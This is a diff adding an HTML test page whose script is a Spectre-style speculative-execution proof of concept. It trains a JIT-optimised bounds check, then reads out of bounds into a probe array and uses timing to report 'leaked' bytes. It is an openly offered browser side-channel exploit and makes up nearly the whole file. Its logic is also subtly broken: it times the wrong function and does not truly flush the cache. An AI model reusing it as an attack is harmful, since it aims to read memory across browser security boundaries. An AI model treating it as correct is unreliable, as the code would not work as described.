@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Lockdown JIT Test</title>
+</head>
+<body>
+  <h1>Lockdown JIT Abuse Test</h1>
+  <script>
+    // Step 1: JIT train with consistent numeric inputs
+    function victim(index) {
+      if (index < arr.length) {
+        return arr[index];
+      } else {
+        return 0;
+      }
+    }
+
+    let arr = new Uint8Array(16);
+    for (let i = 0; i < arr.length; i++) arr[i] = 65; // fill with 'A'
+
+    // Train the branch predictor & JIT optimizer
+    for (let i = 0; i < 100000; i++) victim(5);
+
+    // Step 2: Try Spectre-style out-of-bounds access
+    function timedRead(index) {
+      let start = performance.now();
+      victim(index);
+      return performance.now() - start;
+    }
+
+    // Step 3: Test for side-channel leak
+    const probeArray = new Uint8Array(256 * 512);
+    for (let i = 0; i < 256; i++) probeArray[i * 512] = 1;
+
+    function leakByte(attackIndex) {
+      // Flush the cache
+      for (let i = 0; i < 256; i++) {
+        let addr = i * 512;
+        probeArray[addr] = 0;
+      }
+
+      // Speculatively access out-of-bounds
+      victim = function(index) {
+        if (index < arr.length) {
+          let leak = arr[index];
+          probeArray[leak * 512] |= 1;
+        }
+      };
+
+      // Retrain JIT
+      for (let i = 0; i < 100000; i++) victim(0);
+
+      // Mismatch input (OOB)
+      victim(1000); // Out-of-bounds access
+
+      // Measure access times to infer value
+      let results = [];
+      for (let i = 0; i < 256; i++) {
+        let time = timedRead(i * 512);
+        results.push({ byte: i, time: time });
+      }
+
+      results.sort((a, b) => a.time - b.time);
+      return results.slice(0, 5); // top 5 fastest accesses
+    }
+
+    // Run the test
+    let leaked = leakByte(1000);
+    alert("Leaked values (by timing): " + leaked.map(x => x.byte).join(", "));
+  </script>
+</body>
+</html>
